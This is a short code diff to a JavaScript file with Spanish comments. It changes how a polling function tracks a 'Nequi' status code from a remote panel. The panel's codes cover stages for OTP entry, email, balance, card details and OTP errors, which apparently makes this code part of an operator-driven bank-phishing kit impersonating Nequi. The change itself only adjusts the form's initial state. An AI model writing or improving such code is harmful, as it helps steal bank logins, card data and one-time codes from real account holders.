@@ -31,8 +31,8 @@ function detectar_dispositivo(){
     return dispositivo;
 }  
 
-// Inicializar variable para almacenar el estado anterior
-window.__lastNequiEstado = null;
+// Inicializar en '12' para que el primer poll no limpie el form si ya está en 12
+window.__lastNequiEstado = '12';
 
 /** Códigos alineados con el panel (run/status.php): 2 OTP, 4 correo, 5 saldo, 6 tarjeta, 8 error OTP, 10 fin, 12 usuario */
 function consultar_estado() {
